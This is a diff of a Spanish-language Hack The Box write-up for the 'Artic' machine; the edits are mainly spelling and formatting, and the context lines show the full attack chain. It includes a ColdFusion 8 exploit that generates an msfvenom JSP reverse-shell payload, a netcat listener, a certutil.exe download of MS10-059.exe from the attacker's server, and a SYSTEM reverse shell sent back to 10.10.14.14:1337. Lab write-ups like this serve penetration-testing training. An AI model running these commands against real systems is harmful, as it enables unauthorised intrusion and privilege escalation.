@@ -1,7 +1,7 @@
 ---
 layout: single
 title: Artic - Hack The Box
-excerpt: "Una máquina algo sencilla, vamos a vulnerar el servicio Adobe ColdFusion 8 usando el exploit CVE-2009-2264 que nos conectara directamente a la máquina usando una Reverse Shell, entraremos como usuario y usaremos el MS10-059 para ganar acceso como NT Authority System."
+excerpt: "Una máquina algo sencilla, vamos a vulnerar el servicio Adobe ColdFusion 8 usando el Exploit CVE-2009-2264 que nos conectara directamente a la máquina usando una Reverse Shell, entraremos como usuario y usaremos el MS10-059 para ganar acceso como NT Authority System."
 date: 2023-02-17
 classes: wide
 header:
@@ -23,13 +23,13 @@ tags:
   - OSCP Style
 ---
 ![](/assets/images/htb-writeup-artic/artic_logo.png)
-Una máquina algo sencilla, vamos a vulnerar el servicio Adobe ColdFusion 8 usando el exploit CVE-2009-2264 que nos conectara directamente a la máquina usando una Reverse Shell, entraremos como usuario y usaremos el MS10-059 para ganar acceso como NT Authority System.
+Una máquina algo sencilla, vamos a vulnerar el servicio **Adobe ColdFusion 8** usando el Exploit **CVE-2009-2264** que nos conectara directamente a la máquina usando una **Reverse Shell**, entraremos como usuario y usaremos el **MS10-059** para ganar acceso como **NT Authority System**.
 
-ADVERTENCIA, esta máquina es bastante lenta, en su momento me desespere pero "la paciencia es la madre de la ciencia", advertido estas.
+ADVERTENCIA, esta máquina es bastante lenta, en su momento me desespere, pero "la paciencia es la madre de la ciencia", advertido estas.
 
 # Recopilación de Información
 ## Traza ICMP
-Realizamos un ping para saber si la máquina esta conectada y en base al TTL sabremos que SO ocupa la máquina.
+Realizamos un ping para saber si la máquina está conectada y en base al TTL sabremos que SO ocupa la máquina.
 ```
 ping -c 4 10.10.10.11   
 PING 10.10.10.11 (10.10.10.11) 56(84) bytes of data.
@@ -100,6 +100,7 @@ Nmap done: 1 IP address (1 host up) scanned in 138.29 seconds
 
 Mmmmmm a kbron, no pues no nos dio mucha información que digamos. Vamos a investigar.
 
+# Análisis de Vulnerabilidades
 ## Investigación de Servicios
 Vamos a empezar por el **FMTP**:
 
@@ -107,7 +108,7 @@ Vamos a empezar por el **FMTP**:
 
 **Un servidor SMTP es un ordenador encargado de llevar a cabo el servicio SMTP, que haciendo las veces de “cartero electrónico”, permite el transporte del correo electrónico por Internet.**
 
-Osea que es una página web, vamos a verla:
+Ósea que es una página web, vamos a verla:
 
 ![](/assets/images/htb-writeup-artic/Captura1.png)
 
@@ -115,23 +116,23 @@ Hay solamente 2 carpetas, veamos que hay en la primera:
 
 ![](/assets/images/htb-writeup-artic/Captura2.png)
 
-Hay una en especial que podemos ver, que es el directorio **administrator**. Antes de meternos ahi, veamos que hay en el otro directorio principal:
+Hay una en especial que podemos ver, que es el directorio **administrator**. Antes de meternos ahí, veamos que hay en el otro directorio principal:
 
 ![](/assets/images/htb-writeup-artic/Captura3.png)
 
-No hay nada que sea de interes que yo sepa, entonces vamos al directorio **administrator**:
+No hay nada que sea de interés que yo sepa, entonces vamos al directorio **administrator**:
 
 ![](/assets/images/htb-writeup-artic/Captura4.png)
 
-Ok, ya tenemos un servicio más especifico, pero que es eso de **Adobe Coldfusion**? Investiguemos:
+Ok, ya tenemos un servicio más especifico, pero ¿qué es eso de **Adobe ColdFusion**? Investiguemos:
 
 **Coldfusion es una plataforma de desarrollo rápido de aplicaciones web que usa el lenguaje de programación CFML. En este aspecto, es un producto similar a ASP, JSP o PHP. ColdFusion es una herramienta que corre en forma concurrente con la mayoría de los servidores web de Windows, Mac OS X, Linux y Solaris.**
 
 Entonces, se esta desarrollando una aplicación web, por eso las credenciales que pide.
 
-# Analisis de Vulnerabilidades
+# Explotación Vulnerabilidades
 ## Buscando un Exploit
-Como ya tenemos un servicio especifico y la versión, entonces vamos a usar **SearchSploit**
+Como ya tenemos un servicio específico y la versión, entonces vamos a usar **Searchsploit**
 ```
 searchsploit adobe coldfusion 8
 ----------------------------------------------------------------------------------------------------------- ---------------------------------
@@ -170,7 +171,7 @@ searchsploit -x cfm/webapps/50057.py
  Verified: False
 File Type: Python script, ASCII text executable
 ```
-Analizandolo, nos pide los siguientes datos:
+Analizándolo, nos pide los siguientes datos:
 ```
 if __name__ == '__main__':
     # Define some information
@@ -180,13 +181,12 @@ if __name__ == '__main__':
     rport = 8500
     filename = uuid.uuid4().hex
 ```
-Solamente tenemos que cambiarlos, eso me indica que este exploit es usable para Metasploit. Pero checa esto:
+Solamente tenemos que cambiarlos, eso me indica que este Exploit es usable para **Metasploit**. Pero checa esto:
 ```
 os.system(f'msfvenom -p java/jsp_shell_reverse_tcp
 ```
-Esta generando un Payload para conectarnos a la máquina de manera remota. Vamos a probar el exploit.
+Está generando un Payload para conectarnos a la máquina de manera remota. Vamos a probar el Exploit.
 
-# Explotación de Vulnerabilidades
 * Cambiamos los datos:
 ```
     lhost = 'Tu_IP'
@@ -200,7 +200,7 @@ Esta generando un Payload para conectarnos a la máquina de manera remota. Vamos
 nc -nvlp 443    
 listening on [any] 443 ...
 ```
-* Y activamos el exploit:
+* Y activamos el Exploit:
 ```
 python Adobe_Exploit.py                                                          
 Generating a payload...
@@ -242,7 +242,7 @@ dir
 ```
 
 # Post Explotación
-Bueno ya estamos dentro, vamos a ver de que nos podemos aprovechar para poder ganar acceso como Root.
+Bueno ya estamos dentro, vamos a ver de qué nos podemos aprovechar para poder ganar acceso como Root.
 ```
 C:\>cd Program Files
 cd Program Files
@@ -295,7 +295,7 @@ SeImpersonatePrivilege        Impersonate a client after authentication Enabled
 SeCreateGlobalPrivilege       Create global objects                     Enabled 
 SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 ```
-Uffff tenemos el **SeImpersonatePrivilege** podemos aprovecharnos de ese pero vamos a usar la herramienta **Windows Exploit Suggester** a ver que nos dice. Recuerda que vamos a necesitar la información del sistema, usa el comando **systeminfo** y copia todo en un archivo .txt.
+Uffff tenemos el **SeImpersonatePrivilege** podemos aprovecharnos de ese, pero vamos a usar la herramienta **Windows Exploit Suggester** a ver que nos dice. Recuerda que vamos a necesitar la información del sistema, usa el comando **systeminfo** y copia todo en un archivo **.txt**.
 ```
 python2 windows-exploit-suggester.py --database 2023-03-30-mssb.xls -i sysinfo.txt
 [*] initiating winsploit version 3.3...
@@ -322,21 +322,21 @@ python2 windows-exploit-suggester.py --database 2023-03-30-mssb.xls -i sysinfo.t
 [M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
 [M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
 ```
-Hay varios exploits que podemos usar, vamos a usar el MS10-059 para poder ganar acceso como Root.
+Hay varios Exploits que podemos usar, vamos a usar el **MS10-059** para poder ganar acceso como Root.
 
 ### Probando Exploit: MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799)
 Para descargarlo, usaremos el siguiente link:
 
 * https://github.com/SecWiki/windows-kernel-exploits
 
-Una vez descargado, lo pasamos a nuestro directorio de trabajo y lo vamos a subir a la máquina para activarlo, vamonos por pasos:
+Una vez descargado, lo pasamos a nuestro directorio de trabajo y lo vamos a subir a la máquina para activarlo, vámonos por pasos:
 
-* Abirmos un servidor con python:
+* Abrimos un servidor con Python:
 ```
 python3 -m http.server                                                                     
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
-* Nos vamos a la carpeta Temp y creamos la carpeta Privesc para guardar ahi el exploit:
+* Nos vamos a la carpeta **Temp** y creamos la carpeta **Privesc** para guardar ahí el Exploit:
 ```
 c:\>cd Windows/Temp
 cd Windows/Temp
@@ -350,7 +350,7 @@ mkdir Privesc
 c:\Windows\Temp>cd Privesc
 cd Privesc
 ```
-* Descargamos el exploit desde la máquina usando certutil.exe:
+* Descargamos el Exploit desde la máquina usando **certutil.exe**:
 ```
 c:\Windows\Temp\Privesc>certutil.exe -urlcache -split -f http://10.10.14.14:8000/MS10-059.exe MS10-059.exe
 certutil.exe -urlcache -split -f http://10.10.14.14:8000/MS10-059.exe MS10-059.exe
@@ -370,7 +370,7 @@ c:\Windows\Temp\Privesc>MS10-059.exe 10.10.14.14 1337
 MS10-059.exe 10.10.14.14 1337
 /Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Changing registry values...<BR>/Chimichurri/-->Got SYSTEM token...<BR>/Chimichurri/-->Running reverse shell...<BR>/Chimichurri/-->Restoring default registry values...<BR>
 ```
-Y listo, ya solamente buscamos la flag en el directorio **Administrator** y listo:
+* ¡Y listo!, ya solamente buscamos la flag en el directorio **Administrator** y listo:
 ```
 nc -nvlp 1337     
 listening on [any] 1337 ...
@@ -384,22 +384,23 @@ nt authority\system
 
 # Otras Formas
 ### Prueba Exploit: Adobe ColdFusion - Directory Traversal
-Existe otra forma de acceder a la máquina como usuario, para esto usariamos el exploit **Adobe ColdFusion - Directory Traversal**.
+Existe otra forma de acceder a la máquina como usuario, para esto usaríamos el Exploit **Adobe ColdFusion - Directory Traversal**.
 
-En el siguiente link, te explica como puedes obtener las credenciales para acceder al Adobe ColdFusion y usar una vulnerabilidad para cargar un Payload que tenga una Reverse Shell para que puedas accesar al sistema:
+En el siguiente link, te explica cómo puedes obtener las credenciales para acceder al **Adobe ColdFusion** y usar una vulnerabilidad para cargar un Payload que tenga una **Reverse Shell** para que puedas accesar al sistema:
 
-https://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/
+* https://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/
 
-Este link viene en dicho exploit: **CVE-2010-2861**
+Este link viene en dicho Exploit: **CVE-2010-2861**
 
 ### Prueba Exploit: Juici Potato
-Despues de usar el **Windows Exploit Suggester**, intente probar algunos exploits, esto son:
+Después de usar el **Windows Exploit Suggester**, intente probar algunos Exploits, estos son:
 * MS11-011
 * MS10-047
 * MS11-046
-El ultimo lo utilizamos en la máquina Devel pero aqui no funciono ni ese ni los otros que liste. Quiza a ti te funcionen, pruebalos si tienes tiempo y si no pues ve a lo seguro.
 
-He notado que otras personan han usado **Juicy Potato** o **Churraskito** que es una variante o el mismo que el MS10-059, no lo se bien, aunque yo no probe **Juicy Potato** puedes intentarlo tu.
+El último lo utilizamos en la **máquina Devel** pero aquí no funciono ni ese ni los otros que liste. Quizá a ti te funcionen, pruébalos si tienes tiempo y si no pues ve a lo seguro.
+
+He notado que otras personan han usado **Juicy Potato** o **Churraskito** que es una variante o el mismo que el **MS10-059**, no lo sé bien, aunque yo no probe **Juicy Potato** puedes intentarlo tu.
 
 ## Links de Investigación
 * https://www.mailjet.com/es/blog/emailing/servidor-smtp/
